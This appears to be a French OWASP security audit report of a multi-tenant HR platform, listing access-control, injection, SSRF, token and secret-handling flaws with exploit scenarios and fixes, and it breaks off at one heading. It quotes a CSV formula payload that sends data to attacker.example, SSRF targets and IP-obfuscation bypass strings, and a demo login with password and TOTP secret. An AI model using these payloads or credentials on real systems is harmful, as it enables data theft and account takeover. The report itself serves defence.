# Audit de sécurité OWASP — NexusRH CI (application complète)

> **Statut : TERMINÉ** (6 axes audités, constats consolidés)
> **Remédiation :** P0 ✅ (`d86c7ea`) · P1 ✅ (`f3191fc`, `f9c0338`, `7549296`, `e9900da`, `60d3b73` — PR #203/#204) · **P2 ✅ — les 10 Medium sont traités (PR #205, commit `5f7bf94`)** · P3 ⏳ reste à faire.
> **Depuis :** la **MFA est obligatoire en production** (super_admin + utilisateurs tenant) avec parcours d'enrôlement `/mfa-setup` — PR #206/#207 (`d6e7b77`, `0155aed`), cf. `docs/reference/specs-fonctionnelles.md` § Authentification.
> **Date :** 2026-07-18
> **Périmètre :** intégralité du code applicatif `nexusrh_ci/` (API Fastify, worker BullMQ, front React)
> **Branche / révision :** `develop` @ `b27e6cd`
> **Contexte :** application **en production**, multi-tenant (schema-per-tenant), utilisée depuis plusieurs mois. Audit demandé pour détecter d'éventuels trous de sécurité exploitables par un attaquant.
> **Référentiel :** OWASP Top 10 (2021) — A01→A10.
> **Rapport précédent :** `docs/audit/AUDIT-SECURITE-OWASP.md` (2026-06-07).

---

## 1. Méthodologie

Audit **multi-agents adversarial**, en **lecture seule** (aucune modification pendant la phase de détection). Six revues indépendantes, une par famille de risques OWASP, balayant l'ensemble des modules `apps/api/src/modules/*`, le worker `apps/worker/src/*`, les plugins/middleware et le front `apps/web/src/*` :

| # | Axe OWASP | Cible principale |
|---|-----------|------------------|
| 1 | **A01** — Broken Access Control (RBAC, isolation tenant, IDOR) | routes de tous les modules, middleware auth/tenant, guards |
| 2 | **A03** — Injection (SQL, CSV/formule, commande, template/PDF) | toutes les requêtes DB, exports SAGE/reporting/Excel/PDF |
| 3 | **A10** — SSRF & requêtes sortantes | connecteurs, webhooks, mobile-money, bank-transfer, SSO/SIEM, IA, badgeuse, legal-watch |
| 4 | **A02/A07** — Crypto & Authentification | auth, JWT, MFA/TOTP, chiffrement AES, gestion des secrets |
| 5 | **A09/A05** — Journalisation (secrets en logs) & Misconfiguration | logs, gestion d'erreurs, CORS, en-têtes, rate-limit, TLS |
| 6 | **A04/A08** — Validation d'entrée / Upload / Intégrité | schémas Zod, upload CV/documents, path traversal, HMAC webhooks, prototype pollution |

**Consigne donnée à chaque agent :** ne remonter que des **failles réelles et exploitables** (pas de faux positifs), avec pour chacune : fichier:ligne, rôle/vecteur d'attaque, scénario d'exploitation concret, sévérité, correctif proposé.

### Échelle de sévérité

| Sévérité | Définition |
|----------|-----------|
| **Critical** | Exploitable à distance, impact majeur (RCE, contournement d'auth, fuite/altération de données inter-tenant), à corriger immédiatement. |
| **High** | Exploitable par un utilisateur authentifié malveillant, impact fort (élévation de privilège, IDOR, SSRF vers réseau interne, fuite de secret). |
| **Medium** | Exploitation conditionnelle ou impact limité (info disclosure, DoS partiel, durcissement manquant). |
| **Low / Info** | Bonnes pratiques, défense en profondeur. |

---

## 2. Synthèse exécutive

**Verdict :** la base est **globalement bien durcie** — **aucune injection SQL**, isolation tenant cohérente (aucune route ne fait confiance à un schema issu de la requête), CORS/headers/CSP/rate-limiting/gestion d'erreurs/Swagger-off solides, primitives crypto correctes (AES-256-GCM, bcrypt 12, anti-replay TOTP, rotation refresh). Les risques réels se **concentrent sur 5 thèmes** :

1. **Cycle de vie & scoping des tokens** (le plus grave) — bypass MFA via le token de challenge accepté comme session (`aud` non vérifié), persistance de privilège via `/auth/refresh` re-signant les claims sans lookup DB, pas de révocation du JWT au changement/reset de mot de passe, blacklist par `sub` faute de `jti`.
2. **SSRF** — SMTP tenant **non guardé** (scan réseau interne) + **DNS-rebinding TOCTOU au niveau du guard partagé** (touche toutes les sorties).
3. **Secrets au repos / en logs** — `mfa_secret` TOTP en clair, en-têtes de webhook en clair + dans l'audit, et surtout **dump d'identifiants + secret TOTP dans les logs CI** à chaque déploiement.
4. **Quelques exceptions RBAC / validation** — routes accessibles à `hr_officer`/`readonly` hors matrice, endpoints paie/tenant sans schéma Zod, IDOR sur les soldes de congés.
5. **Robustesse sortante** — lectures de réponse non bornées (DoS mémoire cross-tenant).

Bonne nouvelle : **quelques correctifs centraux** ferment un grand nombre de constats (vérif `aud`, `jti` aléatoire, `encrypt(mfa_secret)`, épinglage d'IP dans le guard SSRF, `encodeField`).

| Sévérité | Nombre |
|----------|--------|
| **Critical** | **3** |
| **High** | **6** |
| **Medium** | **10** (tous corrigés — PR #205) |
| **Low / Info** | **~13** |

### Top priorités (P0 — à traiter immédiatement, prod exposée)

| ID | Constat | Action |
|----|---------|--------|
| **A09-1** | Dump d'identifiants + secret TOTP statique dans les logs CI + comptes démo réels en prod | Retirer le `console.log`, **roter tous les mots de passe démo prod** + le secret TOTP, masquer en CI |
| **A07-1** | Token de challenge MFA = token de session (bypass MFA) | Vérifier `aud` dans `verifyAndCheckBlacklist` (rejeter `mfa-challenge`/`csrf`) |
| **A10-1** | SMTP tenant sans guard SSRF (scan réseau interne) | Guard host:port + message d'erreur générique |

---

## 3. Constats détaillés

### A01 — Contrôle d'accès (RBAC / isolation tenant / IDOR)

**Bilan : 1 High, 4 Medium, 2 Low.** Base globalement bien durcie (isolation tenant, scoping manager fail-closed, identité self-service dérivée du token cohérents). Exceptions réelles ci-dessous.

#### [HIGH] A01-1 — Persistance de privilège après suppression/rétrogradation d'un utilisateur
- **Fichiers :** `apps/api/src/modules/auth/auth.routes.ts:709` (`POST /auth/refresh`) + `apps/api/src/modules/settings/settings.routes.ts` `PATCH /users/:id` (~1027) et `DELETE /users/:id` (~1654).
- **Constat :** `POST /auth/refresh` re-signe un JWT 7 jours **uniquement à partir des claims du token présenté** (`role`, `tenantId`…), **sans aucun lookup DB**. Le jumeau `POST /auth/refresh-token` (749-764) le fait correctement (`verifyAccountActive` + rôle DB courant). Or `PATCH`/`DELETE /users/:id` n'appellent pas `blacklistTokenSafe` et aucun `jti` n'est posé à la signature ; `fastify.authorize()` ne revérifie jamais `is_active`/`role` en base.
- **Exploit :** un compte détenant un JWT valide (admin sur le départ, ou compte compromis qu'on croit avoir coupé) continue d'appeler `/auth/refresh` et reçoit un nouveau token portant le **rôle d'origine (périmé)**, renouvelable indéfiniment sur une fenêtre glissante de 7 jours, alors que l'UI le montre supprimé.
- **Correctif :** (a) dans `PATCH`/`DELETE /users/:id`, appeler `blacklistTokenSafe(userId, ttl)` (la clé retombe déjà sur `sub` → révoque tous les tokens émis) ; (b) faire re-vérifier le statut/rôle en DB par `POST /auth/refresh` comme `POST /auth/refresh-token`.

#### [MEDIUM] A01-2 — IDOR : lecture des soldes de congés d'un collègue
- **Fichier :** `apps/api/src/modules/absences/absences.routes.ts:155-178` (`GET /absences/balances`). preHandler = `fastify.authenticate` seul ; `empId = employeeId ?? request.user.employeeId` fait confiance au paramètre pour tous les rôles.
- **Exploit :** un `employee` appelle `GET /absences/balances?employeeId=<uuid d'un autre>` et obtient ses soldes (pris/en attente/restant). `/my-absences` est correct (ignore le param).
- **Correctif :** pour les rôles non-RH, forcer `request.user.employeeId`, ignorer `query.employeeId`.
- **Statut :** ✅ **Corrigé** — PR #205 (`5f7bf94`). `?employeeId` n'est plus honoré hors RH ; le `manager` est limité à son équipe directe (403 sinon).

#### [MEDIUM] A01-3 — Notes de frais : `readonly` peut créer/soumettre, non-RH peut imputer à autrui
- **Fichier :** `apps/api/src/modules/expenses/expenses.routes.ts:230` (`POST /`), `:284` (`PATCH /:id/submit`). `fastify.authenticate` seul ; l'auto-restriction ne s'applique que si `role==='employee'`.
- **Exploit :** (a) `readonly` (censé être lecture seule) crée et soumet des notes ; (b) un `manager`/`hr_officer` crée une note attribuée à **n'importe quel** employé (`body.employee_id`).
- **Correctif :** `fastify.authorize(...)` excluant `readonly` ; contraindre `employee_id`/submit au périmètre own/team (réutiliser `managerCanActOnReport`).
- **Statut :** ✅ **Corrigé** — PR #205 (`5f7bf94`). `readonly` exclu de la création/soumission ; `manager` limité à son périmètre.

#### [MEDIUM] A01-4 — `hr_officer` lit tout l'historique Mobile Money
- **Fichier :** `apps/api/src/modules/mobile-money/mobile-money.routes.ts:390` (`GET /mobile-money/payments`), gaté `authorize('admin','hr_manager','hr_officer','readonly')`. La matrice RBAC ne donne PAS accès à `hr_officer` (le jumeau `/payments/stats:424` l'exclut correctement). Expose téléphones, montants, provider, IDs de transaction, filtrable par employé.
- **Correctif :** `authorize('admin','hr_manager','readonly')`.
- **Statut :** ✅ **Corrigé** — PR #205 (`5f7bf94`). `hr_officer` retiré de `GET /mobile-money/payments`.

#### [MEDIUM] A01-5 — Un admin tenant peut wiper le référentiel légal partagé plateforme
- **Fichier :** `apps/api/src/modules/referentiels/referentiels.routes.ts:143-173` (`POST /referentiels/seed`, `/reindex`), gaté `authorize('admin','super_admin')`. `admin` est tenant-scoped mais ces routes agissent sur une table légale **globale** (`droit-ci`) et un index ES **partagé**.
- **Exploit :** `admin@<tenant>.ci` déclenche `/seed` (wipe-reseed) ou `/reindex` du référentiel utilisé par **tous** les tenants (atteinte dispo/intégrité ressource partagée). Pas de PII ; rate-limit 3/5min.
- **Correctif :** retirer `'admin'`, garder `'super_admin'`.
- **Statut :** ✅ **Corrigé** — PR #205 (`5f7bf94`). `POST /referentiels/seed` et `/reindex` réservés à `super_admin`.

#### [LOW]
- **A01-6** `apps/api/src/modules/ai/ai-tools.ts:88,160-215` — outils IA agrégés tenant-wide pour `manager` sans filtre `manager_id` (mitigé : `includeNames=false` → comptes seuls, pas de PII). Filtrer par `manager_id`.
- **A01-7** `apps/api/src/modules/platform/platform.routes.ts` — plusieurs routes super_admin sautent le `UUID_RE.test(id)` (non exploitable, requêtes paramétrées ; cohérence).

**Vérifié sain :** plugin auth (whitelist `schemaName` avant interpolation, blacklist + choke-point MFA/reset), hook global bloquant tout acteur `platform` sur routes tenant (403) + gate module (403 `moduleDisabled`), re-scoping cabinet (`assertAgencyCanActOnTenant`, token 30 min, `WHERE id=$1 AND agency_id=$2`), paie/argent (SoD deux-yeux, pas d'IDOR bulletin, IBAN déchiffré RH-or-self), employees (PATCH self + whitelist champs, pas de mass-assignment rôle/salaire), discipline/climate(anonyme)/signature(match token)/onboarding/offboarding (ownership `manager_id`), settings (whitelist rôle excluant super_admin, reset anti-énumération), MM webhook HMAC `timingSafeEqual`. **Aucune route ne fait confiance à un `schemaName`/`tenantId` issu du body/query/params** — tous dérivés du JWT.

### A03 — Injection

**Bilan : 1 High (CSV), 0 injection SQL, 1 Info, 1 Low.** Discipline de paramétrage/allowlist **cohérente sur les 25+ fichiers de routes**.

#### [HIGH] A03-1 — Injection de formule CSV dans l'export du livre de paie
- **Fichier :** `apps/api/src/modules/payroll/payroll.routes.ts:1263-1282` (`GET /payroll/livre-de-paie/:year/export`). Lignes construites par `.join(';')` sur valeurs brutes, **sans** `encodeField`/`sanitizeCsvField` (0 occurrence dans le fichier). `last_name`/`first_name`/`job_title`/`department_name` sont du texte libre non restreint (`employees.routes.ts:39-53`).
- **Exploit :** un `hr_officer` (RW employés) pose `jobTitle = =HYPERLINK("http://attacker.example/leak?d="&A1,"open")` (ou charge DDE/`cmd`) via `POST/PATCH /employees`. Quand un `admin`/`hr_manager` exporte le livre (destiné **aux inspecteurs du travail CI** → souvent transmis à l'externe) et l'ouvre dans Excel, la formule s'exécute → exfiltration (`HYPERLINK`/`WEBSERVICE`) ou exécution DDE sur Excel ancien.
- **Correctif :** envelopper chaque champ avec `encodeField(value, ';')` (déjà présent dans `sage.service.ts`, utilisé correctement par `employees.routes.ts:587` et `cnps.routes.ts`).

#### [INFO] A03-2 — `payroll_rules.formula` → `new Function` (code mort aujourd'hui)
- `settings.routes.ts:1291,1346` stocke `formula` (texte libre 500) ; `services/payroll-engine-ci.ts:127-152` `evalFormule()` fait `new Function(...)` mais après whitelist stricte `^[A-Z0-9_\s\+\-\*\/\.\(\)]+$`. **`evalFormule` n'est appelé nulle part** (code mort). Pas d'action requise ; garder la whitelist si un jour activé.

#### [LOW] A03-3 — Injection HTML dans les emails
- `services/email.ts` : `firstName`/`lastName`/`name`/`logoUrl` interpolés non échappés dans les corps HTML. Injection HTML stockée possible (`<img onerror=...>` dans un nom) mais sévérité faible (clients mail filtrent scripts/handlers ; `logoUrl` autorise déjà `<img src>`). À échapper en durcissement.

**Vérifié sain :** **SQL** — chaque route interpole le schema depuis le JWT (`"${schema}".table`) et construit les `SET`/`WHERE` dynamiques depuis des **allowlists en dur** (`allowed`/`colMap`/tuples), jamais depuis les clés de la requête ; valeurs toujours en `$n` ; aucun `ORDER BY`/identifiant construit depuis `request.query`. **Command injection** — seul `execSync` = script dev d'approbation de fixtures (`git config` fixe, hors HTTP). **Redis** — clés template depuis schema/userId JWT + préfixes fixes, args ioredis discrets (non concaténés). **CSV ailleurs** (`sage`, `employees` export, `cnps`) correctement préfixés `'` sur `=+-@\t\r`. **Excel** (`bank-transfer`, exceljs) — strings inline, pas d'auto-promotion en formule. **PDF** (`hr-document-pdf`, `rns-pdf`) — `drawText` littéral, pas d'exécution.

### A10 — SSRF & sortant

**Bilan : 1 Critical, 1 High (app-wide), 1 Medium (multi-sites), 1 Low.**

#### [CRITICAL] A10-1 — SMTP tenant : aucun guard SSRF, connexion TCP brute + oracle de scan réseau interne
- **Écriture :** `apps/api/src/modules/settings/settings.routes.ts:658-664` — `PUT /settings/email` accepte `smtpHost: z.string().max(255)` et `smtpPort` (1-65535) **sans aucune validation d'hôte/IP** (aucun appel `isSafeOutboundUrl`, contrairement à toutes les autres features sortantes).
- **Déclenchement :** `settings.routes.ts:718-761` — `POST /settings/email/test` (admin tenant) → `sendTestEmail()` → `services/email.ts:58-69` `transporterFor()` → `nodemailer.createTransport({host,port})` → `.sendMail()` = **connexion TCP brute** vers `host:port` depuis le pod API partagé.
- **Fuite :** `settings.routes.ts:744-749` renvoie `sendErr.message` **verbatim** au client. Les erreurs diffèrent selon l'issue (`ECONNREFUSED` = port fermé, timeout = filtré, erreur de greeting sur un vrai listener contient souvent les octets reçus) → **oracle de scan de ports + banner-grab** du réseau interne, gaté seulement par le rôle admin.
- **Exploit :** admin tenant pose `smtpHost=169.254.169.254` (ou `10.x`, `redis.<ns>.svc`, `postgres.<ns>.svc`, `kubernetes.default.svc:443`…) + un port, puis `POST /settings/email/test` en boucle pour énumérer le cluster interne depuis le pod API de confiance.
- **Correctif :** appliquer le guard SSRF (adapté host:port) : résoudre `smtp.host`, rejeter privé/loopback/link-local/CGNAT/metadata ; **ne jamais** renvoyer le message d'erreur brut (log serveur, message générique « connexion SMTP échouée »).

#### [HIGH — app-wide, niveau guard] A10-2 — DNS-rebinding TOCTOU dans le guard SSRF partagé
- **Fichiers :** `apps/api/src/services/ssrf-guard.ts:76-87` (+ copie worker `apps/worker/src/utils/ssrf-guard.ts:78-89`). Le guard résout le hostname une fois (`dns.lookup`), valide les IP, puis **retourne l'URL d'origine (hostname intact)** — pas une IP épinglée. Chaque `fetch(url)` re-résout indépendamment au connect. Aucun `dispatcher`/`lookup`/`Agent` custom dans le repo.
- **Exploit :** l'admin tenant enregistre un domaine qu'il contrôle (TTL très bas) : son DNS répond une IP publique à la requête de validation, puis `169.254.169.254`/`10.x`/`127.0.0.1` à la requête de connexion de `fetch`, quelques ms plus tard. Bypass SSRF classique par rebind DNS.
- **Sites affectés (tous corrects par ailleurs, même trou) :** `attendance.fetch.ts:80-93` / `attendance-poll.ts:233-246` ; `services/mobile-money-providers.ts:160-168` (Wave/MTN/Orange/CinetPay) ; `services/integrations.service.ts:112-116` (`deliverWebhook`) + `:180-191` (`testConnector`) ; `modules/security/security.routes.ts:63-73` (`sendToSiem`) + `:156-159` (découverte SSO `.well-known`). _NB : le commentaire « re-valide à chaque envoi (DNS rebinding) » de `deliverWebhook` est un faux sentiment de sécurité — re-checker avant chaque retry ne ferme pas le trou dans une même paire check→fetch._
- **Correctif (unique, partagé) :** épingler la connexion à l'IP validée — `fetch(url, { dispatcher: new Agent({ connect: { lookup: (_,__,cb)=>cb(null, validatedIp, family) } }) })` en gardant `Host`/SNI. Un seul fix dans `ssrf-guard.ts` durcit tous les sites d'un coup.

#### [MEDIUM — multi-sites] A10-3 — Lectures de réponse non bornées → DoS mémoire cross-tenant
- **Fichiers :** `attendance.fetch.ts:104` (`response.json()`), `attendance-poll.ts:257` (copie), `services/mobile-money-providers.ts:170` (`res.json()`), `services/integrations.service.ts:132` (`res.text()` lit tout avant `.slice(0,300)`).
- **Exploit :** un admin tenant pointe une cible qu'il contrôle (IP publique — le guard bloque le privé ici) qui streame plusieurs Go → épuisement mémoire du process **partagé entre tenants**.
- **Correctif :** compter les octets en flux et abort au-delà d'un cap (2-5 Mo) au lieu de bufferiser puis vérifier. _NB : `apps/worker/src/jobs/legal-watch.ts:35-55` a la même faiblesse (vérifie `MAX_BODY_BYTES` **après** `arrayBuffer()`) → même correctif._
- **Statut :** ✅ **Corrigé** — PR #205 (`5f7bf94`). Helper `readBodyCapped`/`readJsonCapped` (api **et** worker, copies mirrorées) : toutes les lectures sortantes sont bornées — 5 Mo par défaut, 64 Ko pour les réponses de webhook, 1 Mo pour la veille légale.

#### [LOW/INFO] A10-4 — `legal-watch` worker sans guard SSRF (non atteignable aujourd'hui)
- `apps/worker/src/jobs/legal-watch.ts:35-55` (`fetchText`) : `fetch` sans `assertSafeOutboundUrl`. `sourceUrl` vient uniquement de l'env `LEGAL_WATCH_SOURCES` au boot, pas d'une route tenant/super_admin (la route ne queue jamais ce job aujourd'hui). **Non exploitable** actuellement ; à guarder avant toute future API de déclenchement.

**Vérifié sain :** tous les sites ci-dessus font le guard **avant** fetch + `redirect:'manual'|'error'` + re-guard à l'écriture (create/patch) ; en-têtes tenant custom ne peuvent pas écraser la signature HMAC (ordre de spread) ; URLs IA/HIBP sourcées **de l'env serveur** (jamais du tenant) donc hors périmètre SSRF. **Guard testé contre les bypass** : obfuscation IPv4 décimale/octale/hexa (`2130706433`, `0x7f.0.0.1`, `127.1`) canonicalisées→bloquées ; IPv6 mappé metadata (`[::ffff:169.254.169.254]`) résolu et bloqué — pas de bypass, juste un chemin de code incohérent.

### A02 / A07 — Cryptographie & Authentification

**Bilan : 1 Critical, 2 High, 1 Medium, 1 Low, 1 Info.** Primitives crypto solides ; faiblesses dans le **scoping des tokens** et le **secret-at-rest**, pas dans les primitives.

#### [CRITICAL] A07-1 — Token de challenge MFA accepté comme token de session → bypass MFA
- **Fichiers :** `apps/api/src/plugins/auth.ts:86-130` (`verifyAndCheckBlacklist`) ne vérifie **jamais le claim `aud`** (seulement `schemaName`, `mfaPending`, `pwdResetRequired`, blacklist). Le challenge émis par `auth-mfa.routes.ts:555-565` (`buildMfaChallenge`, `{sub,schemaName,tenantId,aud:'mfa-challenge',userId}`, TTL 3 min, renvoyé dans le body de `POST /auth/login` quand mdp OK mais MFA non vérifiée) passe donc `fastify.authenticate` sur toute route ne re-checkant pas le rôle.
- **Exploit :** attaquant **avec le seul mot de passe** (sans TOTP) → `POST /auth/login` → reçoit `challenge` → `Authorization: Bearer <challenge>` sur : `GET /careers/my-evaluations`/`my-skills` (`careers.routes.ts:393,427`, résolus par `employees.user_id = sub`, aucun check rôle) → scores perf/commentaires manager ; `GET /payroll/my-access-log:1177` ; `/training/catalog`, `/careers/skills` (catalogues tenant via `schemaName`) ; `GET /auth/me` ; et surtout `POST /auth/refresh` → re-signe en **JWT 7 jours** (fenêtre de 3 min → semaine renouvelable). Contourne la MFA pour toute route ne re-vérifiant pas rôle/employeeId.
- **Correctif :** rejeter tout token à `aud` non-session (`mfa-challenge`, `csrf`) dans `verifyAndCheckBlacklist` ; signer les challenges avec un secret/purpose distinct ; exiger `role` présent et validé pour toute route atteignable via `authenticate`.

#### [HIGH] A02-2 — Secret TOTP stocké en clair
- **Fichier :** `apps/api/src/modules/auth/auth-mfa.routes.ts:178` — `UPDATE ... SET mfa_secret = $1` stocke le seed base32 brut (`mfa_secret varchar(255)`). `encrypt()`/`decrypt()` (AES-256-GCM, `utils/crypto.ts`) existe (IBAN/NNI) mais **jamais appliqué**.
- **Exploit :** compromission DB (SQLi ailleurs, backup fuité, insider) → tous les seeds TOTP en clair → codes valides à vie = bypass MFA **permanent, silencieux, indétectable** sur tout le tenant/plateforme.
- **Correctif :** chiffrer `mfa_secret` au repos via `encrypt()`/`decrypt()`, comme IBAN/NNI.

#### [HIGH] A07-3 — Pas de révocation du token d'accès au changement/reset de mot de passe
- **Fichiers :** `auth.routes.ts:962-978` (`change-password`) révoque les refresh mais ne blackliste **pas le JWT courant** ; `auth-mfa.routes.ts:430-486` (`reset-password`) ne fait **ni l'un ni l'autre** (n'appelle même pas `revokeAllRefreshTokensForUser`).
- **Exploit :** un JWT volé garde l'accès complet jusqu'à `JWT_EXPIRES_IN` (7 j) **même après** que la victime a changé/réinitialisé son mot de passe ; via reset, le refresh 30 j de l'attaquant survit aussi.
- **Correctif :** blacklister le token présenté sur les deux flux + appeler `revokeAllRefreshTokensForUser` depuis `reset-password` ; idéalement comparer `iat` du token à `password_changed_at` dans `verifyAndCheckBlacklist`.

#### [MEDIUM] A07-4 — Blacklist logout par `sub` (jamais de `jti`) → self-lockout / DoS
- **Fichiers :** aucun `sign()` ne pose de `jti` ; `plugins/auth.ts:126` et `auth.routes.ts:784` retombent sur `jti ?? user.sub` → `blacklistTokenSafe` (`services/redis.ts:6-23`) blackliste par **user id** pour la TTL du token (jusqu'à 7 j).
- **Exploit :** (a) logout d'un device tue toutes les sessions ; (b) un token neuf émis par un login suivant est **immédiatement rejeté** (« Token révoqué ») → l'utilisateur qui se déconnecte/reconnecte est lockout jusqu'à 7 j ; (c) un attaquant avec un token volé lock durablement la victime hors de son compte via `POST /auth/logout`.
- **Correctif :** poser un `jti` aléatoire (`randomUUID()`) par token signé et blacklister par jti.
- **Statut :** ✅ **Corrigé** — PR #205 (`5f7bf94`). `jti` aléatoire posé sur les **11 sites de signature** ; la blacklist de logout porte désormais sur le `jti` (plus de self-lockout jusqu'à 7 j). La révocation « toutes sessions » de la **suspension d'un cabinet** est passée à `setTokenEpoch` (le bon outil pour ce cas).

#### [LOW] A02-5 — Secrets infra à défauts faibles, pas fail-closed en prod
- `apps/api/src/config.ts:53-54,60` — `S3_ACCESS_KEY`/`S3_SECRET_KEY` = `minioadmin`, `MEILISEARCH_MASTER_KEY` = `nexusrhci-dev-master-key` par défaut, sans rejet au boot prod (contrairement à `JWT_SECRET`/`ENCRYPTION_KEY` qui fail-closed, lignes 108-124).

#### [INFO] A07-6 — Garde CSRF via `jwt.decode` (non vérifié) au lieu de `jwt.verify`
- `apps/api/src/app.ts:200` extrait `sub` du cookie auth via `jwt.decode` (pas de vérif signature) pour cross-check CSRF. Non exploitable aujourd'hui (le handler fait un vrai `jwtVerify`, cookie httpOnly) ; utiliser `jwt.verify` par cohérence.

**Vérifié sain :** bcrypt cost 12 partout (prod) ; login timing-safe (`DUMMY_BCRYPT_HASH` même sur email inconnu, pas d'énumération) ; `findTenantAndUser` compare le mdp par candidat (pas de first-tenant-wins) ; JWT secret ≥32 requis, fail-closed prod, HS256 (pas de `alg:none`/RS confusion) ; anti-replay TOTP (`consumeTotpStep`, window ±1) ; backup codes bcrypt single-use ; `crypto.ts` AES-256-GCM (IV 12o aléatoire, tag vérifié, clé 64 hex, `EncryptionUnavailableError` fail-closed) ; HIBP k-anonymity (préfixe 5, fail-open) ; lockout fail-open + rate-limit IP 10/5min ; rotation refresh (opaque 32o, SHA-256, révoqué à chaque usage, re-check compte actif) ; CSRF non rejouable en session (pas de `schemaName`) ; reset tokens (32o, SHA-256, single-use, 15 min).

### A09 / A05 — Secrets en logs & Misconfiguration

**Bilan : 1 Critical, 2 Medium, 4 Low.**

#### [CRITICAL] A09-1 — Dump de tous les identifiants + secret TOTP dans les logs CI/CD
- **Fichiers :** `apps/api/src/db/seed.ts:2000-2027` (+ secret posé `:485-491`) et `.github/workflows/ci-build.yml:220-243`. Le seed `console.log` le **roster complet** des identifiants fonctionnels (super_admin, SOTRA admin/hr_manager/hr_officer/manager/employee/DG, Cabinet Expertise, WOYAA, cabinet Talents) **+ un secret TOTP statique en clair** : `mfa@sotra.ci / Admin1234! (secret TOTP: JBSWY3DPEHPK3PXP)`.
- **Exploit :** ce seed tourne à **chaque push sur `main`** (`kubectl exec ... node dist/db/seed.js`) → le dump (incluant le secret de bypass MFA) stream dans les **logs GitHub Actions** (chaînes en dur, **non masquées** par la redaction auto). Ces comptes démo sont **réels et actifs en prod** (namespace `nexusrh-ci`, documentés dans `CLAUDE.md`). → prise de contrôle admin d'un tenant prod, MFA contournable via le TOTP statique connu, **sans exploitation** au-delà de lire un log ou le repo.
- **Correctif :** ne jamais imprimer d'identifiants/secrets sur stdout dans un script lancé par la CI prod (supprimer le bloc récap ou le gater `NODE_ENV!=='production'`) ; générer le secret TOTP démo aléatoirement par environnement ; `::add-mask::` si un credential doit apparaître ; chiffrer `mfa_secret` (cf. A02-2).

#### [MEDIUM] A05-2 — xlsx virement bancaire (IBAN/NNI déchiffrés) non couvert par `no-store`
- **Fichiers :** `apps/api/src/app.ts:127-158` — `SENSITIVE_CONTENT_TYPES` ne matche pas `application/vnd.openxmlformats-officedocument.spreadsheetml.sheet`, le Content-Type de `GET /bank-transfer/file` (`bank-transfer.routes.ts:126`) qui sert un `.xlsx` contenant **IBAN et NNI déchiffrés** de chaque employé payé par virement.
- **Exploit :** sur un poste/navigateur RH partagé, le fichier est mis en cache et réouvrable par un autre utilisateur de la machine — exactement ce que le `no-store` devait empêcher.
- **Correctif :** étendre le regex aux types xlsx/ms-excel (ou passer d'allowlist à denylist `text/html`/assets).
- **Statut :** ✅ **Corrigé** — PR #205 (`5f7bf94`). `no-store` étendu aux types xlsx **et** à toute réponse portant `Content-Disposition: attachment`.

#### [MEDIUM] A09-3 — En-têtes de webhook stockés en clair + copiés dans l'audit
- **Fichiers :** `apps/api/src/modules/integrations/integrations.routes.ts:150,158-182`. `integration_webhooks.headers` stocké **non chiffré** (`JSON.stringify`, pas de `_enc`, contrairement à `auth_secret_enc`) et renvoyé en clair par `GET /webhooks` ; sur `PATCH /webhooks/:id`, tout le body (dont `headers`) est spread dans `audit_log.changes` (`{ ...b }`, ligne 182). Or ces en-têtes portent souvent `Authorization: Bearer <token>`/clé API du système destinataire → credential du destinataire en clair dans **2 emplacements DB**.
- **Correctif :** chiffrer `headers` au repos comme `auth_secret_enc` ; dans l'audit, réduire aux **noms de clés** (patron déjà utilisé pour mobile-money/SSO/SIEM).
- **Statut :** ✅ **Corrigé** — PR #205 (`5f7bf94`). Nouvelle colonne `integration_webhooks.headers_enc` (AES au repos) ; `GET /webhooks` ne renvoie plus que les **noms** de clés et l'audit ne contient plus aucune valeur d'en-tête.

#### [LOW]
- **A02-2 (rappel)** `mfa_secret` en clair sur toute l'app (racine qui rend A09-1 exploitable via secret statique) — cf. section A02.
- **A09-4** `modules/security/security.routes.ts:163,225,251` — `/sso-config/test`, `/siem-config/test`, `/siem/forward` renvoient `(e as Error).message` brut (admin/self-tenant ; aide à la reco réseau interne). Mapper vers un enum de raisons sûres.
- **A09-5** `bank-transfer.routes.ts:177` — `POST /bank-transfer/send` renvoie l'erreur SMTP brute par banque (self-tenant ; peut fuiter host/auth SMTP). Message générique.
- **A05-6** `config.ts:52-60` — `S3_ACCESS_KEY/SECRET` (`minioadmin`) et `MEILISEARCH_MASTER_KEY` sans fail-fast prod (mitigé par Helm `required`+`secretKeyRef` aujourd'hui ; défense en profondeur manquante hors chart). Ajouter le check `NODE_ENV==='production'` comme JWT/ENCRYPTION_KEY.

**Vérifié sain :** CORS (allowlist stricte, pas de wildcard+credentials/reflection) ; error handler global + `db-error.ts` (aucune stack/SQL/constraint au client, détail loggé serveur) ; headers sécu (HSTS, X-Frame-Options, nosniff, CSP `default-src 'none'`, COOP/CORP) ; rate-limiting (global 200/min + login 10/5min, MFA, création tenant, writes settings, webhooks) ; Swagger désactivé en prod ; réponses config à secret renvoient **booléens seuls** (`hasApiKey`/`secretSet`) malgré `SELECT *` ; audit mobile-money/SSO/SIEM/sage = noms/booléens seulement ; `.env` gitignoré, `.env.example` = placeholders ; secrets K8s via `secretKeyRef` (plusieurs `required`) ; boot prod `process.exit(1)` si `JWT_SECRET`/`ENCRYPTION_KEY` faibles.

### A04 / A08 — Validation d'entrée / Upload / Intégrité

**Bilan : 1 High, 3 Medium, 3 Low/Info.** Aucun exploit critique distant/non-auth (CV upload/download, apply public, garde SSRF, clés API entrantes, `getByPath` — tous durcis).

#### [HIGH] A04-1 — `POST /settings/variable-elements` : aucune validation + accessible `hr_officer`
- **Fichier :** `apps/api/src/modules/settings/settings.routes.ts:1602-1635`. `const body = request.body as {...}` (cast TS, **pas** de check runtime), autorisé pour `hr_officer` (que la matrice RBAC exclut de l'écriture paie). `amount` sans borne (colonne `numeric(12,0)` sans CHECK, ±10¹²), injecté dans `payroll-engine-ci.ts` (`variableElements[e.varKey]`, clés spéciales `AVANCE`/`MUTUELLE_*`) qui calcule `net_payable`. `rule_code`/`month` non validés. `employee_id` non vérifié avant `ON CONFLICT DO UPDATE`.
- **Exploit :** un `hr_officer` injecte un montant arbitraire/négatif sur un vrai employé → distord un bulletin qui pilote un **décaissement Mobile Money réel**, sans plafond ni workflow d'approbation (le `DELETE` jumeau, lui, restreint bien à admin/hr_manager).
- **Correctif :** restreindre `POST` (et `GET`) à admin/hr_manager ; Zod `.strict()` (montant borné `z.number().int().min(-X).max(X)`, `rule_code` enum/regex, `month` `^\d{4}-\d{2}$`).

#### [MEDIUM] A08-2 — Photos employés (PII) dans le bucket public cross-tenant des logos
